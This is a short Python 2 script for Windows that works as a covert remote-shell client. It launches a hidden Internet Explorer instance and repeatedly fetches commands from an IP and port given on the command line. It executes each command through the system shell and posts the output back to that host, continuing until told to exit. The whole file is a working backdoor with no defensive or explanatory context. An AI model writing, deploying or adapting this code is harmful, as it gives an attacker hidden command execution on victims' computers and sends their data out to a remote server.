import sys
from win32com.client import Dispatch
from time import sleep
import subprocess


def main():
    if len(sys.argv) < 3:
        print '[!] Usage: ', __file__, ' <ip> <port>'
        return

    sys.argv = sys.argv[1:]
    url = 'http://' + sys.argv[0] + ':' + sys.argv[1]
    flags = 0
    target_frame = ''

    ie = Dispatch('InternetExplorer.Application')
    ie.Visible = 0

    while True:

        ie.Navigate(url)

        while ie.ReadyState != 4:
            sleep(1)

        command = ie.Document.body.innerHTML
        command = unicode(command)
        command = command.encode('ascii', 'ignore')
        print 'Cmd: ', command

        command_split = command.split(' ', 1)
        action = command_split[0].lower()
        if len(command_split) == 2:
            args = command_split[1]
        else:
            args = ''

        if 'exit' == action:
            ie.Quit()
            break
        else:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            data = cmd.stdout.read()
            post_data = buffer(data)
            ie.Navigate(url, flags, target_frame, post_data)

        sleep(3)

main()
